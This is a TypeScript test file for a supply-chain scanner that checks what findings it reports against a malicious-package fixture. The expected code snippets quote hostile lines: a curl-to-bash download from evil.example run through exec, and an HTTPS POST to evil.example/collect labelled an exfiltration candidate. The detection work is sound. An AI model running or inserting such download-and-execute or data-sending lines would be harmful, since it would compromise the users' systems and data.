import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildInventory } from "../src/inventory.js";
import { runRules } from "../src/rules.js";

describe("runRules", () => {
  it("creates evidence-grounded findings for scripts, command execution, network candidates, and risky dependencies", async () => {
    const root = path.resolve("fixtures/malicious-package");
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);

    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "postinstall-script",
        riskLevel: "High",
        filePath: "package.json",
        lineStart: 1,
        codeSnippet: '"postinstall": "node src/index.ts"',
        confidence: "High",
        evidenceTags: ["package-script", "postinstall"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "supply-chain",
        riskLevel: "High",
        filePath: "package.json",
        lineStart: 1,
        codeSnippet: "github:some-user/suspicious-repo",
        confidence: "High",
        evidenceTags: ["dependency-source"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "command-injection",
        riskLevel: "Critical",
        filePath: "src/index.ts",
        lineStart: 13,
        lineEnd: 13,
        codeSnippet: "exec(`curl https://evil.example/install.sh | bash`);",
        confidence: "High",
        evidenceTags: ["command-execution"]
      })
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        category: "network",
        riskLevel: "High",
        filePath: "src/index.ts",
        lineStart: 9,
        lineEnd: 9,
        codeSnippet: 'https.request("https://evil.example/collect", { method: "POST" }).end(',
        confidence: "High",
        evidenceTags: ["network-endpoint", "exfiltration-candidate", "sensitive-source-present"],
        sink: "https://evil.example/collect"
      })
    );
    expect(findings.some((finding) => finding.category === "data-exfiltration")).toBe(false);
  });

  it("does not classify child_process imports as command injection", async () => {
    const root = await createProject({
      "src/index.ts": [
        'import { exec } from "node:child_process";',
        "",
        'exec("echo hello");',
        ""
      ].join("\n")
    });
    const inventory = await buildInventory(root);
    const findings = runRules(inventory);
    const commandFindings = findings.filter((finding) => finding.category === "command-injection");

    expect(commandFindings).toEqual([
      expect.objectContaining({
        category: "command-injection",
        riskLevel: "High",
        filePath: "src/index.ts",
        lineStart: 3,
        lineEnd: 3,
        codeSnippet: 'exec("echo hello");',
        confidence: "High",
        evidenceTags: ["command-execution"]
      })
    ]);
    expect(commandFindings.some((finding) => finding.codeSnippet.includes("child_process"))).toBe(false);
  });
});

async function createProject(files: Record<string, string>): Promise<string> {
  const rootDir = await fs.mkdtemp(path.join(os.tmpdir(), "rules-test-"));

  await Promise.all(
    Object.entries(files).map(async ([filePath, content]) => {
      const fullPath = path.join(rootDir, filePath);
      await fs.mkdir(path.dirname(fullPath), { recursive: true });
      await fs.writeFile(fullPath, content);
    })
  );

  return rootDir;
}
